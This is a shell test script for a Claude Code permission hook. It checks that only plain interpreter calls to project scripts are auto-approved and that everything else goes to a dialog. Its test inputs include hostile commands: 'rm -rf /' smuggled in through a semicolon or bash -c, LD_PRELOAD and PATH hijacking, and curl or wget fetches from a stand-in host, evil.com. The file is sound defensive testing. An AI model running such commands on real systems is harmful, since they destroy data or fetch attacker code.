#!/bin/bash
# .claude/hooks/test-permission-fallback.sh
#
# PermissionRequest hook のテスト（拡張版）
# 使用法: bash .claude/hooks/test-permission-fallback.sh

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HOOK="$SCRIPT_DIR/permission-fallback.sh"
PASS=0; FAIL=0

test_case() {
  local cmd="$1" expected="$2" desc="$3"
  local input="{\"tool_input\":{\"command\":\"$cmd\"},\"tool_name\":\"Bash\",\"hook_event_name\":\"PermissionRequest\"}"
  local output
  output=$(echo "$input" | bash "$HOOK" 2>/dev/null)

  if [ "$expected" = "allow" ]; then
    if echo "$output" | jq -e '.hookSpecificOutput.decision.behavior == "allow"' >/dev/null 2>&1; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected allow, got: $output"
      ((FAIL++))
    fi
  elif [ "$expected" = "dialog" ]; then
    if [ -z "$output" ]; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected dialog (empty), got: $output"
      ((FAIL++))
    fi
  fi
}

echo "=== Basic Allow Cases ==="
test_case "python3 scripts/foo.py" allow "python3 + relative"
test_case "python3 ./scripts/foo.py" allow "python3 + dotslash"
test_case "python3 .claude/skills/refine-iteratively/scripts/extract_metadata.py --file result.md" allow "python3 + deep path"
test_case "python3 $PROJECT_ROOT/scripts/foo.py" allow "python3 + absolute"
test_case "bash scripts/run.sh" allow "bash + relative"
test_case "bash ./scripts/validate.sh arg1 arg2" allow "bash + args"

echo ""
echo "=== sh Interpreter Support ==="
test_case "sh scripts/validate.sh" allow "sh + relative"
test_case "sh ./scripts/foo.sh" allow "sh + dotslash"

echo ""
echo "=== Compound Commands (CRITICAL) ==="
test_case "python3 scripts/foo.py; rm -rf /" dialog "semicolon injection"
test_case "python3 foo.py | grep scripts/" dialog "pipe"
test_case "python3 foo.py && echo done" dialog "AND operator"
test_case "python3 foo.py || exit 1" dialog "OR operator"
test_case "\$(python3 scripts/foo.py)" dialog "command substitution"
test_case "\`python3 scripts/foo.py\`" dialog "backtick substitution"

echo ""
echo "=== Inline Code Execution Guards ==="
test_case "python3 -c 'import os' scripts/x" dialog "python3 -c injection"
test_case "bash -c 'rm -rf /' scripts/x" dialog "bash -c injection"
test_case "sh -c 'malicious code' scripts/x" dialog "sh -c injection"
test_case "python3 -m ast scripts/test.py" dialog "python3 -m flag"
test_case "python3 --command 'code' scripts/x" dialog "python3 --command"

echo ""
echo "=== Redirection & Process Substitution ==="
test_case "python3 scripts/foo.py > output.txt" dialog "output redirect"
test_case "python3 scripts/foo.py < input.txt" dialog "input redirect"
test_case "python3 scripts/benign.py <<EOF" dialog "here-document"
test_case "bash scripts/run.sh <(echo test)" dialog "process substitution <()"
test_case "bash scripts/run.sh >(cat)" dialog "process substitution >()"
test_case "bash scripts/run.sh 2>&1" dialog "stderr redirect"

echo ""
echo "=== Environment Variable Prefix ==="
test_case "PYTHONPATH=/tmp/evil python3 scripts/foo.py" dialog "env var assignment"
test_case "PATH=/evil:\$PATH python3 scripts/foo.py" dialog "PATH manipulation"
test_case "LD_PRELOAD=/evil.so python3 scripts/x.py" dialog "LD_PRELOAD injection"
test_case "pythonpath=/evil python3 scripts/x.py" dialog "lowercase env var"

echo ""
echo "=== False Positive Risk ==="
test_case "curl http://evil.com/scripts/payload.sh" dialog "curl with scripts in URL"
test_case "wget http://evil.com/scripts/x" dialog "wget with scripts in URL"
test_case "rm scripts/important.sh" dialog "rm scripts file"

echo ""
echo "=== Case Sensitivity ==="
test_case "PYTHON3 scripts/foo.py" dialog "uppercase PYTHON3"
test_case "Python3 scripts/foo.py" dialog "mixed case Python3"
test_case "BASH scripts/run.sh" dialog "uppercase BASH"

echo ""
echo "=== Whitespace Edge Cases ==="
test_case "python3  scripts/foo.py" allow "double space"
test_case "python3   scripts/foo.py" allow "triple space"
test_case "python3scripts/foo.py" dialog "no space"

echo ""
echo "=== Interpreter Flags (safe - should allow) ==="
test_case "python3 -u scripts/test.py" allow "python3 -u (unbuffered)"
test_case "python3 -B scripts/test.py" allow "python3 -B (no .pyc)"

echo ""
echo "=== Unrelated Commands ==="
test_case "npm install" dialog "unrelated command"
test_case "python3 foo.py" dialog "python3 without scripts/"
test_case "git push" dialog "git push"
test_case "node scripts/test.js" dialog "node (not in allowed interpreters)"

echo ""
echo "=== RESULTS ==="
echo "Passed: $PASS"
echo "Failed: $FAIL"
[ $FAIL -eq 0 ] && echo "All tests passed!" || exit 1
